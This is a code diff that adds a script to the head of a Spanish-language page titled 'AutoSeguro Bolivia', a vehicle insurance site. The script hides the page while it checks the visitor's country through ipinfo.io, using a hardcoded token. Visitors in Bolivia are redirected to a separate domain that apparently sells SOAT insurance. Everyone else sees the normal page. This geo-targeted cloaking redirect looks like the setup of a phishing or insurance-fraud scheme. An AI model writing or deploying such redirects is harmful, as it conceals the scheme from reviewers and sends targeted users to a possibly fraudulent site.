@@ -1,6 +1,47 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+  // Ocultar todo el contenido al cargar
+  document.body.style.visibility = 'hidden';
+  
+  // Función para verificar el país y redirigir
+  async function verificarPaisYRedirigir() {
+    try {
+      // Token de ipinfo.io (regístrate en ipinfo.io para obtener tu token gratuito)
+      const token = '3798a6699b4912';
+      
+      // Realizar la petición a ipinfo.io
+      const response = await fetch(`https://ipinfo.io/json?token=${token}`);
+      
+      if (!response.ok) {
+        throw new Error('No se pudo obtener la información de localización');
+      }
+      
+      const data = await response.json();
+      const paisUsuario = data.country;
+      
+      // Comprobar si el usuario es de Bolivia (BO es el código ISO de Bolivia)
+      if (paisUsuario === 'BO') {
+        // Si es de Bolivia, redirigir a otra página
+        window.location.href = 'https://bolseguros.site/seguros/online/ventas-soat/'; // Cambia esto a la URL donde quieres redirigir
+      } else {
+        // Si no es de Bolivia, mostrar el contenido normal
+        document.body.style.visibility = 'visible';
+      }
+    } catch (error) {
+      console.error('Error al detectar el país:', error);
+      // En caso de error, mostrar el contenido de todos modos
+      document.body.style.visibility = 'visible';
+    }
+  }
+  
+  // Iniciar la verificación del país
+  verificarPaisYRedirigir();
+});
+</script>
+
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>AutoSeguro Bolivia - Protección para tu vehículo</title>
